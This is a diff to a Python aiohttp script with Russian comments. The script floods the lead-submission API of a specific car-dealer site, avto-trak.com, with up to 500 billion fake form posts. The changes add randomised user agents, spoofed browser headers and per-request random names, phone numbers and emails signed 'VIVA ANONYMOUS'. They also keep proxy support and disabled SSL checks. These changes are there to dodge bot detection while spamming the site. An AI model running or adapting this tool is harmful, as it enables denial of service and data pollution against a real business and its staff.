@@ -11,28 +11,19 @@ import urllib.request
 import uuid
 
 from datetime import datetime, timezone
+from fake_useragent import UserAgent
 
 import aiohttp
 
 from aiohttp_socks import ProxyConnector
 
-TARGET_URL = "https://avto-trak.com" 
+TARGET_URL = "https://avto-trak.com/api/leads" 
 
 TOTAL_REQUESTS = 500000000000       # Общее количество запросов
-DELAY_BETWEEN_REQ = 0.001      # Пауза перед отправкой следующего запроса в рамках воркера
-MAX_CONCURRENT = 1000           # Количество параллельных воркеров (потоков)
+DELAY_BETWEEN_REQ = 0.1      # Пауза перед отправкой следующего запроса в рамках воркера
+MAX_CONCURRENT = 20          # Количество параллельных воркеров (потоков)
 
-iso_string = datetime.now(timezone.utc).isoformat(timespec='milliseconds').replace('+00:00', 'Z')
-res = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
 
-payload = {
-    "name": "WE ANONYMOUS " + res,
-    "phone": "+79999999999",
-    "email": "I_AM" + res +"@FUCK.YOU",
-    "comment": "VIVA ANONYMOUS " * 20,
-    "car": "Mitsubishi ASX - " + res,
-    "source": "Карточка авто"
-}
 
 request_counter = 0
 success_count = 0
@@ -106,13 +97,40 @@ async def worker(worker_id):
         else:
             connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3)
       
-        timeout = aiohttp.ClientTimeout(total=10) 
-      
+        timeout = aiohttp.ClientTimeout(total=100) 
+
+        ua = UserAgent()
+
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             try:
                 global request_counter, success_count, fail_count
     
                 while True:
+                    
+                    current_user_agent = ua.random
+
+                    headers = {
+                        "Accept": "*/*",
+                        "Accept-Encoding": "gzip, deflate, br, zstd",
+                        "Accept-Language": "ru,en;q=0.9",
+                        "Cache-Control": "no-cache",
+                        "Connection": "keep-alive",
+                        "Content-Type": "application/json",
+                        "Host": "avto-trak.com",
+                        "Origin": "https://avto-trak.com",
+                        "Pragma": "no-cache",
+                        "Referer": "https://avto-trak.com/",
+                        "Sec-Fetch-Dest": "empty",
+                        "Sec-Fetch-Mode": "cors",
+                        "Sec-Fetch-Site": "same-origin",
+                        "User-Agent": current_user_agent,
+                        # Подсказки клиента (можно тоже сделать динамическими или оставить статичными)
+                        "sec-ch-prefers-color-scheme": random.choice(["dark", "light"]),
+                        "sec-ch-ua": '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
+                        "sec-ch-ua-mobile": "?0",
+                        "sec-ch-ua-platform": '"macOS"',
+                    }
+
                     async with counter_lock:
                         if request_counter >= TOTAL_REQUESTS:
                             break
@@ -120,8 +138,22 @@ async def worker(worker_id):
                         current_request_num = request_counter
 
                     try:
+                        iso_string = datetime.now(timezone.utc).isoformat(timespec='milliseconds').replace('+00:00', 'Z')
+                        res = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
+                        res_2 = ''.join(random.choices(string.ascii_letters, k=3))
+                        res_p = ''.join(random.choices(string.digits, k=10))
+                        phone = "+7" + res_p
+                        payload = {
+                            "name": res_2 + " " + res,
+                            "phone": phone,
+                            "email": "I_AM" + res +"@" + res_2,
+                            "comment": "VIVA ANONYMOUS",
+                            "car": "Citroën SpaceTourer",
+                            "source": "Слайдер на главной"
+                        }
+
                         start_time = time.time()
-                        async with session.post(TARGET_URL, json=payload, timeout=5, ssl=False) as response:
+                        async with session.post(TARGET_URL, json=payload, headers=headers, timeout=50, ssl=False) as response:
                             duration = time.time() - start_time
                             if response.status in (200, 201):
                                 print(f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно (Статус: {response.status}, Время: {duration:.3f}с)")
@@ -130,6 +162,8 @@ async def worker(worker_id):
                                 print(f"[-] Запрос {current_request_num} (Воркер {worker_id}): Сервер вернул код {response.status}")
                                 async with counter_lock: fail_count += 1
                     except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                        print(f"[!!!] ")
+                       
                         print(f"[!] Запрос {current_request_num} (Воркер {worker_id}): Ошибка соединения ({e})")
                         async with counter_lock: fail_count += 1
 
@@ -179,3 +213,7 @@ if __name__ == "__main__":
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
         
     asyncio.run(main())
+
+
+
+
